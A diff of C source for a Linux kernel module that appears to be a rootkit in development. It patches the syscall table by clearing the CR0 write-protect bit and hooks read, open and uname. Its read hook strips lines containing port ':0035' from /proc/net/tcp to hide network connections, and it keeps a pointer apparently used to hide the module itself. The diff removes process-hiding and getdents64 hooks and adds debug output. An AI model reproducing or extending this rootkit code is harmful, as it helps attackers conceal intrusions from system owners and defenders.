@@ -50,8 +50,6 @@ MODULE_LICENSE("GPL");
 #define PROTECTED_FLAG 0x10000
 
 static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
-static char pid_list[10][32];
-static int last_proc = -1;
 static unsigned long **_sys_call_table = NULL;
 static int failed = 0;
 static char opened_name[50];
@@ -71,49 +69,46 @@ static asmlinkage long open(const char __user *filename, int flags, umode_t mode
 
 static asmlinkage long read(unsigned int fd, char __user *buf, size_t count) {
   int i,j,p,k;
-  char *userp;
   int ret;
   mm_segment_t old_fs;
-  char line[1000];
+  char line[500];
   int copy;
-
-  userp = kmalloc(count, GFP_KERNEL);
-  if (!userp)
-    return -ENOBUFS;
 
   old_fs = get_fs();
   set_fs(KERNEL_DS);
-  ret = org_read(fd, userp, count);
+  ret = org_read(fd, buf, count);
   set_fs(old_fs);
-  if (opened_fd == fd && strcmp(opened_name, "/proc/net/tcp") == 0) {
+  if (opened_fd == fd && strncmp(opened_name, "/proc/net/tcp", 13) == 0) {
+    printk("%s\n", opened_name);
     for (i = j = p = 0; i < ret; i++,j++) {
-      if (userp[i] == '\n') {
-        line[j++] = userp[i];
-        line[j] = '\0';
+      if (buf[i] == '\n' || buf[i] == '\0') {
+        line[j] = buf[i];
         copy = 1;
-        for (k = 0; k < j; k++) {
+        for (k = 0; k < j - 4; k++) {
           if (strncmp(line+k, ":0035", 5) == 0) {
             copy = 0;
             break;
           }
         }
         if (copy) {
-          if (copy_to_user(buf+p, line, j-1)) {
+          printk("copying\n");
+          if (copy_to_user(buf+p, line, j+1)) {
+            printk("copying failed\n");
             ret = -EAGAIN;
             goto end;
           }
-          p += (j-1);
+          p += j+1;
         }
-        j = 0;
+        j = -1;
       } else {
-        line[j] = userp[i];
+        line[j] = buf[i];
       }
     }
-    buf[p] = '\0';
+    printk("%s\n", buf);
+    if (ret > 0)
+      ret = p;
   }
 end:
-  kfree(userp);
-
   return ret;
 }
 
@@ -158,7 +153,6 @@ static asmlinkage long getdents64(unsigned int fd, struct linux_dirent64 __user
   int ret;
   mm_segment_t old_fs;
 
-  printk(KERN_ALERT "done");
   buf = kmalloc(count, GFP_KERNEL);
   if (!buf)
     return -ENOBUFS;
@@ -222,9 +216,6 @@ static inline void memorize(void) {
 
   org_uname = _sys_call_table[__NR_uname];
   org_read = _sys_call_table[__NR_read];
-  org_getdents64 = _sys_call_table[__NR_getdents64];
-  org_getdents = _sys_call_table[__NR_getdents];
-  org_read = _sys_call_table[__NR_read];
   org_open = _sys_call_table[__NR_open];
 }
 
@@ -268,35 +259,19 @@ static inline void set_write_permission(void) {
   __asm__("mov %0, %%cr0" : : "r" (cr0 | PROTECTED_FLAG)); 
 }
 
-static inline void hide_proc(char* pid) {
-  if (last_proc == 9)
-    return;
-  strcpy(pid_list[++last_proc], pid);
-}
-
 // on module load
 static int __init load_module(void) {
   memorize(); 
-  if (failed)
-    return 0;
-
   clear_write_permission();
   _sys_call_table[__NR_uname] = uname;
-  _sys_call_table[__NR_getdents64] = getdents64;
   _sys_call_table[__NR_read] = read;
   _sys_call_table[__NR_open] = open;
-  //_sys_call_table[__NR_getdents] = getdents;
-  printk(KERN_ALERT "done2");
   return 0;
 }
 
 // on module unload
 static void __exit cleanup(void) {
-  if (failed)
-    return;
-
   _sys_call_table[__NR_uname] = org_uname;
-  _sys_call_table[__NR_getdents64] = org_getdents64;
   _sys_call_table[__NR_read] = org_read;
   _sys_call_table[__NR_open] = org_open;
   set_write_permission();
